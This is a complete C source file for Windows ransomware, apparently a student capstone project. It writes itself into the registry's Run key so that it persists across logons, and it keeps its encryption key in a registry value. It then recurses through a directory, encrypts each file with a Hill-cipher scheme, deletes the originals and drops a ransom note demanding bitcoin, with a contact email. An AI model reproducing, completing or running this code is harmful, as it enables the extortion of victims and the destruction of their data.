#include <windows.h>
#include <tchar.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <errno.h>

#define MAX_FILENAME_LENGTH 256
#define MAX_KEY_LENGTH 16

void ls_dir(char *start_path);
void encryptfile(FILE *fpin, FILE *fpout, unsigned char *key);

int _tmain(int argc, _TCHAR *argv[])
{

    /*
    It creates a new subkey named 'MyHive' in the Windows registry, where it stores the encryption key. 
    After creating the registry hive and setting a key within it and its directory path, the function closes the registry key. 
    Then, it calls the ls_dir function to list files and directories in the specified starting path.  
    in the Windows registry, where it stores the encryption key

    */

    char *start_path = "C:\\infected\\capstone";

    HKEY hKey;
    LONG result;

    DWORD dwDisposition;
    LONG lRes;

    // Create a new registry hive
    lRes = RegCreateKeyEx(
        HKEY_CURRENT_USER,
        "SOFTWARE\\MyHive",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        &dwDisposition);

    if (lRes != ERROR_SUCCESS)
    {
        printf("Error creating registry key: %d\n", lRes);
        return 1;
    }

    // Store a text value in the new registry hive
    char value[] = "INFECTED";
    lRes = RegSetValueEx(
        hKey,
        "MyValue",
        0,
        REG_SZ,
        (const BYTE *)value,
        sizeof(value));

    if (lRes != ERROR_SUCCESS)
    {
        printf("Error setting registry value: %d\n", lRes);
        return 1;
    }

    // RegCloseKey(hKey);

    TCHAR programPath[MAX_PATH];
    GetModuleFileNameA(NULL, programPath, MAX_PATH);

    // Open the Run key for the current user
    result = RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS)
    {
        printf("Failed to open registry key. Error code: %d\n", result);
        return 1;
    }

    result = RegSetValueEx(hKey, _T("MyProgram"), 0, REG_SZ, (BYTE *)programPath, strlen(programPath) + 1);

    if (result != ERROR_SUCCESS)
    {
        printf("Failed to add entry to registry key. Error code: %d\n", result);
        return 1;
    }

    RegCloseKey(hKey);
    ls_dir(start_path);
    return 0;
}

void ls_dir(char *start_path)
{

    /*
    Recursively traverses the directory specified by start_path and encrypts regular files 
    (excluding directories and specific system files) found within it. Also, it retrieves the key from the registry and 
    passes it as a parameter to the encryptfile function. This approach is implemented to avoid storing the encryption 
    key directly in the executable and instead retrieve it at runtime from the registry, reducing key exposure.

    :param start_path: a pointer to a character array that represents the path of the directory to be searched.
    */
   
    // Open the registry key for querying
    HKEY hKey;
    LONG lResult;
    DWORD dwDisposition;
    DWORD dwType;
    DWORD dwSize = MAX_KEY_LENGTH;
    char dwValue[MAX_KEY_LENGTH];
    char keyPath[] = "SOFTWARE\\MyHive";
    char keyName[] = "MyValue";

    // Query the registry key for the stored value
    lResult = RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_QUERY_VALUE, &hKey);
    if (lResult == ERROR_SUCCESS)
    {
        lResult = RegQueryValueExA(hKey, keyName, NULL, &dwType, (LPBYTE)dwValue, &dwSize);

        // Check if the query was successful and the value type is REG_SZ
        if (lResult == ERROR_SUCCESS && dwType == REG_SZ)
        {
            // Success
        }
        else
        {
            printf("Error querying registry value.\n");
        }

        // Close the registry key
        RegCloseKey(hKey);

        // Copy the retrieved key value into an unsigned char array
        unsigned char key[MAX_KEY_LENGTH];
        strcpy(key, dwValue);

        // Open the specified directory
        DIR *dir;
        struct dirent *ent;
        if ((dir = opendir(start_path)) != NULL)
        {
            // Iterate over the files and directories in the directory
            while ((ent = readdir(dir)) != NULL)
            {
                int len = strlen(ent->d_name);
                const char *last_four = &ent->d_name[len - 4];

                // Exclude files with the extension ".enc"
                if (strcmp(last_four, ".enc") != 0)
                {
                    // Process regular files
                    if (ent->d_type == DT_REG)
                    {
                        // Create the path for the README file
                        char *full_path_readme = (char *)malloc(strlen("RANSOMEWARE_INFO") + strlen(start_path) + 2);
                        strcpy(full_path_readme, start_path);
                        strcat(full_path_readme, "RANSOMEWARE_INFO");

                        char full_path[MAX_FILENAME_LENGTH];
                        strcpy(full_path, start_path);

                        // Append the file name to the path
                        strcat(full_path, "\\");
                        strcat(full_path, ent->d_name);

                        char new_name[MAX_FILENAME_LENGTH];
                        strcpy(new_name, full_path);
                        strcat(new_name, ".enc");

                        // Exclude certain system files from encryption
                        if (strcmp(full_path, "C:\\Windows\\System32\\config\\SAM") != 0 &&
                            strcmp(full_path, "C:\\Windows\\System32\\config\\SECURITY") != 0 &&
                            strcmp(full_path, "C:\\Windows\\System32\\config\\SOFTWARE") != 0)
                        {
                            FILE *fpin;
                            FILE *fpout;
                            FILE *fpreadme;

                            // Open the input file for reading
                            fpin = fopen(full_path, "rb");
                            // Open the output file for writing the encrypted content
                            fpout = fopen(new_name, "wb");
                            // Open the README file for writing
                            fpreadme = fopen(full_path_readme, "w");

                            // Write the ransom note content to the README file
                            fprintf(fpreadme, "You have been HACKED! \n\n Here All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Transfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:qwertyuiopasdfghjkl\n Email:infected02capstone@gmail.com \n");

                            // Encrypt the file using the provided key
                            encryptfile(fpin, fpout, key);

                            // Close the file pointers
                            fclose(fpin);
                            fclose(fpout);
                            fclose(fpreadme);

                            // Remove the original unencrypted file
                            int a = remove(full_path);
                        }
                    }
                    // Process directories recursively
                    else if (ent->d_type == DT_DIR)
                    {
                        char full_path[MAX_FILENAME_LENGTH];
                        strcpy(full_path, start_path);
                        strcat(full_path, "\\");
                        strcat(full_path, ent->d_name);
                        strcat(full_path, "\\");

                        // Exclude the current directory and directories starting with '.'
                        if (full_path != start_path && ent->d_name[0] != '.')
                        {
                            // Recursively list files and directories in the subdirectory
                            ls_dir(full_path);
                        }
                    }
                }
            }
            // Close the directory
            closedir(dir);
        }
    }
}


void encryptfile(FILE* fpin, FILE* fpout, unsigned char* key)
{

    /*
    Reads the contents from fpin, encrypts using Hill Cipher and writes the cipher text into only into first 4096 bytes of fpout.
    :param start_path: a pointer to a character array that represents the path of the directory to be searched.
    :param fpin: a pointer to the input file.
    :param fpout: a pointer to the output file.
    :param key: an array of unsigned characters that represents the encryption key.
    */

    // Using Hill Cipher to encrypt a file
    int k = strlen(key);

    // Generate the encryption matrix
    int matrix_size = k;
    int matrix[matrix_size][matrix_size];
    for (int i = 0; i < matrix_size; i++) {
        for (int j = 0; j < matrix_size; j++) {
            matrix[i][j] = key[(i + j) % k] - 'A';
        }
    }
    
    const unsigned bufsize = 4096;
    // Set up buffer for reading from file and writing encrypted data into file
    unsigned char* read_buf = malloc(bufsize);
    unsigned char* write_buf = malloc(bufsize);
    size_t bytes_read;
    int i, j, sum;
    int write_index = 0;

    if (fpin == NULL || fpout == NULL) {
        printf("Error: failed to open file.\n");
        return;
    }
    
    // Read from the input file in chunks and encrypt each chunk
    while ((bytes_read = fread(read_buf, sizeof(unsigned char), bufsize, fpin)) > 0) {
        for (i = 0; i < bytes_read; i += matrix_size) {
            
            // Multiply the current chunk of input data by the encryption matrix
            for (j = 0; j < matrix_size; j++) {
                sum = 0;
                for (int k = 0; k < matrix_size; k++) {
                    if (i + k < bytes_read) {
                        sum += matrix[j][k] * read_buf[i + k];
                    }
                }
                write_buf[write_index++] = (unsigned char)(sum % 256);
            }
        }
        fwrite(write_buf, sizeof(unsigned char), write_index, fpout);
        write_index = 0;
    }
    free(read_buf);
    free(write_buf);
}